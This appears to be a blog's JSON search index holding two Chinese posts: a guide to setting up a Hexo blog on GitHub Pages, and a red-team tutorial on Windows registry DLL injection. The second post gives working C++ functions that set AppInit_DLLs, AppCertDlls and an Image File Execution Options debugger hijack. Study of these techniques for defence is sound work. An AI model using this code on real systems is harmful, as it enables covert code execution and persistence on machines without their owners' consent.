[{"title":"hexo+github搭建博客","url":"/Hexo+github%20Build%20Blog/","content":"<p>使用Hexo配合NEXT主题搭建个人主页，再上传到Github repository中来对外发布。</p>\n<span id=\"more\"></span>\n\n\n\n<h2 id=\"0x01-安装环境\"><a href=\"#0x01-安装环境\" class=\"headerlink\" title=\"0x01 安装环境\"></a>0x01 安装环境</h2><p>我这里使用的是Ubuntu20.04</p>\n<h3 id=\"Ubuntu安装nodejs\"><a href=\"#Ubuntu安装nodejs\" class=\"headerlink\" title=\"Ubuntu安装nodejs\"></a>Ubuntu安装nodejs</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install nodejs</span><br><span class=\"line\">sudo apt install npm</span><br><span class=\"line\">node --version</span><br><span class=\"line\">npm --version</span><br></pre></td></tr></table></figure>\n\n<p>nodejs的版本低于12就会报错，需要升级nodejs，安装一个node版本切换工具 n</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g n</span><br><span class=\"line\">sudo n stable</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x02-安装Hexo\"><a href=\"#0x02-安装Hexo\" class=\"headerlink\" title=\"0x02 安装Hexo\"></a>0x02 安装Hexo</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Hexo创建博客\"><a href=\"#Hexo创建博客\" class=\"headerlink\" title=\"Hexo创建博客\"></a>Hexo创建博客</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir blog</span><br><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">hexo init <span class=\"comment\"># 初始化创建博客文件</span></span><br><span class=\"line\">hexo clean <span class=\"comment\"># 清除生成的发布目录</span></span><br><span class=\"line\">hexo generate <span class=\"comment\"># 生成发布目录</span></span><br><span class=\"line\">hexo server <span class=\"comment\"># 开启本地服务</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x03-安装NEXT主题\"><a href=\"#0x03-安装NEXT主题\" class=\"headerlink\" title=\"0x03 安装NEXT主题\"></a>0x03 安装NEXT主题</h2><p>在Github项目中<a href=\"https://github.com/theme-next/hexo-theme-next\">NEXT主题</a>是有theme-next来维护的</p>\n<p>在博客根目录下直接用git下载：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>\n\n<p>此时在 Hexo 中有两份主要的配置文件，其名称都是 <code>_config.yml</code>。      其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。在以下说明中，将前者称为<code>站点配置文件</code>，后者称为<code>主题配置文件</code>。    </p>\n<p>打开<code>站点配置文件</code>，找到theme字段，将其改为next：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">theme:</span> <span class=\"string\">next</span></span><br></pre></td></tr></table></figure>\n\n<p>NexT 主题安装完成，启用前使用<code>hexo clean</code> 来清除 Hexo 的缓存，再使用<code>Hexo generate</code>重新生成缓存。</p>\n<h2 id=\"0x04-Gihub发布\"><a href=\"#0x04-Gihub发布\" class=\"headerlink\" title=\"0x04 Gihub发布\"></a>0x04 Gihub发布</h2><h3 id=\"1-Github创建仓库\"><a href=\"#1-Github创建仓库\" class=\"headerlink\" title=\"1 Github创建仓库\"></a>1 Github创建仓库</h3><p>需要创建一个仓库命名为$username.github.io</p>\n<h3 id=\"2-生成Github-Token\"><a href=\"#2-生成Github-Token\" class=\"headerlink\" title=\"2 生成Github Token\"></a>2 生成Github Token</h3><p>在Github的<code>Settings/Developer settings/Personal access tokens</code>中点击右侧的<code>Generate new taken</code>按钮，注意下面还有勾选token的权限范围</p>\n<p><img src=\"1.png\"></p>\n<p>点击下方的<code>Generate token</code>按钮</p>\n<p><img src=\"2.png\"></p>\n<p>token只会显示一次，所以最好将token保存在本地</p>\n<h3 id=\"3-部署网站\"><a href=\"#3-部署网站\" class=\"headerlink\" title=\"3 部署网站\"></a>3 部署网站</h3><p>首先需要修改<code>站点配置文件</code>：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repository:</span> <span class=\"string\">https://token@github.com/username/username.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">main</span></span><br></pre></td></tr></table></figure>\n\n<p>Hexo安装Git部署插件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<p>设置git信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;Your Name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;you@example.com&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>开始部署：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean </span><br><span class=\"line\">hexo g </span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>","categories":["Util"],"tags":["Web"]},{"title":"RegistryInjection","url":"/RegistryInjection/","content":"<h1 id=\"Windows进程注入方法-注册表注入\"><a href=\"#Windows进程注入方法-注册表注入\" class=\"headerlink\" title=\"Windows进程注入方法-注册表注入\"></a>Windows进程注入方法-注册表注入</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p>windows整个系统的配置都保存在这个注册表中，有以下位置可以用来进行dll注入：</p>\n<ul>\n<li><code>AppInit_DLLs</code></li>\n<li><code>AppCertDlls</code></li>\n<li><code>image file execution options</code></li>\n</ul>\n<span id=\"more\"></span>\n\n<h2 id=\"0x2-AppInit-DLLs\"><a href=\"#0x2-AppInit-DLLs\" class=\"headerlink\" title=\"0x2 AppInit_DLLs\"></a>0x2 AppInit_DLLs</h2><h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>64 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n<p>32 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n</blockquote>\n<p>当User32.dll被映射到一个新的进程时，会收到<code>DLL_PROCESS_ATTACH</code>通知，就会取得上述注册表键的值，并调用<code>LoadLibary</code>来载入这个字符串中指定的每个DLL。</p>\n<p>DLL只会被映射到那些使用了<code>user32.dll</code>的进程中，所有基于GUI的应用程序都使用了<code>user32.dll</code>，但大多数基于CUI的应用程序都不会使用它。</p>\n<h3 id=\"2-步骤\"><a href=\"#2-步骤\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>有两个键值需要修改：</p>\n<ul>\n<li><code>AppInit_DLLs</code>：指定一个dll路径或系统路径下的dll名称</li>\n<li><code>LoadAppInit_DLLs</code>：设置为1时注入才会起效</li>\n</ul>\n<h3 id=\"3-代码\"><a href=\"#3-代码\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppInit_DLLsInject</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD dwValue = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegOpenKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>, </span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        &amp;hKey</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;AppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    dwValue = <span class=\"number\">1</span>;</span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;LoadAppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_DWORD,</span><br><span class=\"line\">        (BYTE*)&amp;dwValue,</span><br><span class=\"line\">        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(dwValue)</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x3-AppCertDlls\"><a href=\"#0x3-AppCertDlls\" class=\"headerlink\" title=\"0x3 AppCertDlls\"></a>0x3 AppCertDlls</h2><h3 id=\"1-原理-1\"><a href=\"#1-原理-1\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager</p>\n</blockquote>\n<p>此注册表项下的DLL被加载到调用<code>Win32 API</code>函数<code>CreateProcess</code>，<code>CreateProcessAsUser</code>，<code>CreateProcessWithLogonW</code>，<code>CreateProcessWithTokenW</code>和<code>WinExec</code>的每个进程中。</p>\n<h3 id=\"2-步骤-1\"><a href=\"#2-步骤-1\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>现在该位置创建一个子项<code>AppCertDlls</code>，然后在该子项中创建一对键值，将值设置为要注入dll的路径</p>\n<h3 id=\"3-代码-1\"><a href=\"#3-代码-1\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppCertDllsInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Default&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x4-Image-Hijack（映像文件执行选项（IFEO））\"><a href=\"#0x4-Image-Hijack（映像文件执行选项（IFEO））\" class=\"headerlink\" title=\"0x4 Image Hijack（映像文件执行选项（IFEO））\"></a>0x4 Image Hijack（映像文件执行选项（IFEO））</h2><h3 id=\"1-原理-2\"><a href=\"#1-原理-2\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</p>\n</blockquote>\n<p><code>IFEO</code>通常用于调试目的。开发人员可以在此注册表项下设置<code>调试器值</code>，以将程序附加到另一个可执行文件以进行调试。</p>\n<p>就是原程序的启动命令行作为参数传递给了调试器，例如<code>notepad.exe</code> ==&gt; <code>cmd.exe notepad.exe</code></p>\n<h3 id=\"2-步骤-2\"><a href=\"#2-步骤-2\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><ul>\n<li>创建一个子项，名称就是目标程序名称，例如<code>notepad.exe</code></li>\n<li>在该子项中创建一对键值，键名为<code>debugger</code>，值设置为调试器程序路径</li>\n</ul>\n<h3 id=\"3-代码-2\"><a href=\"#3-代码-2\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ImageHijackInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szPath[] = <span class=\"string\">&quot;cmd.exe&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\notepad.exe&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Debugger&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a><em>参考链接</em></h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows","readteam"]}]